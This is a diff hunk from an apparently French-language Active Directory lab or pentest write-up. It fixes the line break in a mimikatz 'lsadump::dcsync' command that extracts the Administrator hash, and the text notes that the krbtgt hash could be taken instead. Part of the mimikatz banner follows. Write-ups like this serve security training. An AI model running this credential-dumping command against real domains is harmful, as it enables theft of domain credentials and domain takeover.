@@ -123,8 +123,7 @@ A==
 On peut alors faire un dcsync avec mimikatz (ici on récupère le hash de Administrator, mais on pourrait récupérer celui de krbtgt):
 
 ```
-.\mimikatz.exe "lsadump::dcsync /domain:SHINRA-INC.local /user:SHI
-NRA-INC\Administrator"
+.\mimikatz.exe "lsadump::dcsync /domain:SHINRA-INC.local /user:SHINRA-INC\Administrator"
 
   .#####.   mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
